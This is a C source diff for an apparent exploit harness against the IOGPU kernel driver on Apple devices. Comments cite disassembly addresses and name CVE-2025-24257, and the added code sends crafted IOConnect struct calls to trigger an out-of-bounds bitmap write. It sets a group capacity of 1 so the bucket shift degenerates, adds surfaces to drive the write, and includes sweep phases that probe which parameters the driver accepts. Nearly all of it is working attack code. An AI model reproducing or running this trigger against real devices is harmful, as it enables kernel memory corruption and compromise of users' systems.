@@ -330,7 +330,64 @@ void nk_iogpu_group_oob_run(int trigger)
         ol("[grp] capacity field hunt done (calls=%u)", g_calls);
     }
 
-    if (trigger) {
+    if (trigger == 2) {
+        /* THE cmd=64 PATH: capacity 1.
+         *
+         * The handler 0x9f612f0 takes the capacity from struct[56] and the
+         * dimension size from struct[80], then rounds the capacity UP to a
+         * multiple of the dimension: (cap + dim - 1) & -dim (0x9f4d328).
+         * With dim == 1 the rounding is a no-op, so the capacity stays 1.
+         * capacity == 1 means log2(capacity) == 0, which makes the bucket
+         * shift in the insert path degenerate (0x9f62c04 lsr x9, x20, x9:
+         * a shift by 64 becomes a shift by 0) - the bucket becomes the full
+         * 64-bit hash and the bitmap access leaves the allocation. That is
+         * the CVE-2025-24257 write, and it is a 4-byte RMW at a
+         * hash-derived offset.
+         *
+         * cmd=64 has to be the FIRST command on the session: the handler
+         * refuses when bit 1 of the session state byte is set
+         * (0x9f61350 ldrb w8,[x20,#64] / tbnz w8,#1), and creating a group
+         * with cmd=3 sets it. The earlier matrix created a group first and
+         * therefore never reached this path.
+         */
+        ol("[grp] === cmd=64 UNDERFLOW TRIGGER (capacity=1, dim=1) ===");
+        ol("[grp] session must be clean: this is the first command on the connection");
+
+        static uint8_t o64[0x200];
+        size_t on64 = 0;
+        int k64 = call_sel(conn, 64, 1, 0, 0, 0, o64, &on64);
+        uint64_t grp64 = 0;
+        if (k64 == 0) memcpy(&grp64, o64 + 0x10, 8);
+        ol("[grp] cmd=64 cap=1 dim=1 -> kr=0x%x grp=0x%016llx outN=%zu", k64,
+           (unsigned long long)grp64, on64);
+        for (uint32_t w = 0; w + 8 <= 0x40; w += 8) {
+            uint64_t v = 0;
+            memcpy(&v, o64 + w, 8);
+            ol("[grp]   out[+0x%02x]=0x%016llx", w, (unsigned long long)v);
+        }
+        if (k64 != 0) {
+            ol("[grp] cmd=64 refused (kr=0x%x) - capacity 1 not accepted on this build", k64);
+            ol("[grp] no underflow trigger; the group was not created");
+        } else {
+            ol("[grp] *** group with capacity 1 created - the mask is (1>>6)-1 = 0xffffffff");
+            ol("[grp] adding the surface: the insert will compute bucket = hash >> 0");
+            for (uint32_t extra = 0; extra < 8 && extra < nsurf; extra++) {
+                ol("[grp] OOB add surf_id=%u", surf_ids[extra]);
+                int ke = call_sel(conn, CMD_ADD_RES, surf_ids[extra], 1, 0, 0, o64, &on64);
+                ol("[grp] OOB add surf_id=%u -> kr=0x%x", surf_ids[extra], ke);
+                if (ke == (int)0x10000003) {
+                    ol("[grp] client died (INVALID_DEST) - the out-of-bounds "
+                       "bitmap access already hit unmapped memory");
+                    break;
+                }
+            }
+            ol("[grp] closing the connection (the group destructor walks the "
+               "bitmap with the underflowed mask)");
+        }
+        ol("[grp] cmd=64 trigger done");
+    }
+
+    if (trigger == 1) {
         /* DIRECT GROW on a FRESH connection.
            0x10000003 = MACH_SEND_INVALID_DEST: the IOGPU user client dies
            when a group is destroyed (on 18.3 that was the kernel panic; on
@@ -693,6 +750,81 @@ static int cm_dim(const char *tag, uint64_t cap, uint64_t dim, uint64_t f64,
     return (int)kr;
 }
 
+
+/* cmd=64 WITHOUT a prior cmd=3.
+ *
+ * The previous matrix run always created a group first (cmd=3) and then
+ * sent cmd=64 on the same session. But the handler checks a bit in the
+ * SESSION state before doing anything:
+ *   0x9f61350: ldrb w8, [x20, #64]
+ *   0x9f61354: tbnz w8, #1 -> fail
+ * Creating a group sets that bit, so every cmd=64 in the old matrix
+ * arrived at a session that had already refused it. The "cmd=64 is dead"
+ * conclusion was a test artifact, not a property of the build.
+ *
+ * This version sends cmd=64 FIRST on a fresh connection, then optionally
+ * retries after a cmd=3 so the two orders can be compared.
+ */
+static int cm_dim_fresh(const char *tag, uint64_t cap, uint64_t dim,
+                        uint64_t f64, uint64_t f72, int do_create_first)
+{
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                                    IOServiceMatching("IOGPU"));
+    if (!svc) { CM_LOG("[cm] no IOGPU service"); return -1; }
+    io_connect_t conn = MACH_PORT_NULL;
+    for (uint32_t t = 0; t <= 40 && !conn; t++) {
+        io_connect_t c = MACH_PORT_NULL;
+        if (IOServiceOpen(svc, mach_task_self(), t, &c) == KERN_SUCCESS && c) conn = c;
+    }
+    if (!conn) { CM_LOG("[cm] no usable type"); return -1; }
+
+    static uint8_t in[STRUCT_SZ];
+    static uint8_t out[0x200];
+    uintptr_t ap = (uintptr_t)g_args;
+
+    if (do_create_first) {
+        memset(in, 0, sizeof(in));
+        uint64_t c3 = CMD_NEW_GROUP;
+        memcpy(in + 0, &c3, 8);
+        uint64_t t64 = 64;
+        memcpy(in + 56, &t64, 8);
+        uint64_t one = 1;
+        memcpy(in + 80, &one, 8);
+        memcpy(in + 24, &ap, 8);
+        size_t on = sizeof(out);
+        memset(out, 0, on);
+        kern_return_t kr = IOConnectCallStructMethod(conn, IOGPU_SEL, in, sizeof(in), out, &on);
+        CM_LOG("[cm] %s pre-create cmd3 -> kr=0x%x", tag, kr);
+    }
+
+    memset(in, 0, sizeof(in));
+    uint64_t c64 = 64;
+    memcpy(in + 0, &c64, 8);
+    memcpy(in + 56, &cap, 8);
+    memcpy(in + 64, &f64, 8);
+    memcpy(in + 72, &f72, 8);
+    memcpy(in + 80, &dim, 8);
+    memcpy(in + 24, &ap, 8);
+    size_t on = sizeof(out);
+    memset(out, 0, on);
+    kern_return_t kr = IOConnectCallStructMethod(conn, IOGPU_SEL, in, sizeof(in), out, &on);
+    uint64_t h = 0;
+    memcpy(&h, out + 0x10, 8);
+    CM_LOG("[cm] %s cmd64 FRESH cap=%llu dim=%llu f64=%llu f72=%llu -> kr=0x%x grp=0x%llx %s",
+           tag, (unsigned long long)cap, (unsigned long long)dim,
+           (unsigned long long)f64, (unsigned long long)f72, kr,
+           (unsigned long long)h, (kr == 0) ? "*** ACCEPTED ***" : "");
+    if (kr == 0) {
+        for (uint32_t w = 0; w + 8 <= 0x40; w += 8) {
+            uint64_t v = 0;
+            memcpy(&v, out + w, 8);
+            CM_LOG("[cm]   out[+0x%02x]=0x%016llx", w, (unsigned long long)v);
+        }
+    }
+    IOServiceClose(conn);
+    return (int)kr;
+}
+
 void nk_iogpu_capacity_matrix(void)
 {
     nk_doc_log_open("cap_matrix.log");
@@ -769,6 +901,41 @@ void nk_iogpu_capacity_matrix(void)
         static const uint64_t caps2[] = { 1,2,4,8,16,32,64,128,256 };
         for (size_t i = 0; i < sizeof(caps2)/sizeof(caps2[0]); i++)
             cm_dim("J", caps2[i], 1, 0, 0);
+    }
+
+    /* phase K: cmd=64 on a FRESH session (no prior cmd=3) */
+    CM_LOG("[cm] --- K: cmd=64 on a fresh session ---");
+    {
+        static const uint64_t dims[] = { 1,2,4,8,16,32,64,128,256,512,4096,16384,65536 };
+        for (size_t i = 0; i < sizeof(dims)/sizeof(dims[0]); i++)
+            cm_dim_fresh("K", 1, dims[i], 0, 0, 0);
+    }
+
+    /* phase L: cmd=64 fresh, capacity sweep with dim=1 */
+    CM_LOG("[cm] --- L: cmd=64 fresh, dim=1, capacity sweep ---");
+    {
+        static const uint64_t caps3[] = { 1,2,3,4,8,16,32,63,64,128,256 };
+        for (size_t i = 0; i < sizeof(caps3)/sizeof(caps3[0]); i++)
+            cm_dim_fresh("L", caps3[i], 1, 0, 0, 0);
+    }
+
+    /* phase M: cmd=64 fresh, dim=1, cap=1, neighbours varied */
+    CM_LOG("[cm] --- M: cmd=64 fresh, cap=1 dim=1, f64/f72 sweep ---");
+    {
+        static const uint64_t vals[] = { 0,1,2,3,64,4096,16384 };
+        for (size_t i = 0; i < sizeof(vals)/sizeof(vals[0]); i++)
+            cm_dim_fresh("M", 1, 1, vals[i], 0, 0);
+        for (size_t i = 0; i < sizeof(vals)/sizeof(vals[0]); i++)
+            cm_dim_fresh("M", 1, 1, 0, vals[i], 0);
+    }
+
+    /* phase N: the same, but with the group created first (the old order),
+       to show the difference the session bit makes */
+    CM_LOG("[cm] --- N: cmd=64 after a cmd=3 create (old order) ---");
+    {
+        static const uint64_t dims[] = { 1,2,64,16384 };
+        for (size_t i = 0; i < sizeof(dims)/sizeof(dims[0]); i++)
+            cm_dim_fresh("N", 1, dims[i], 0, 0, 1);
     }
 
     CM_LOG("[cm] === capacity matrix done ===");
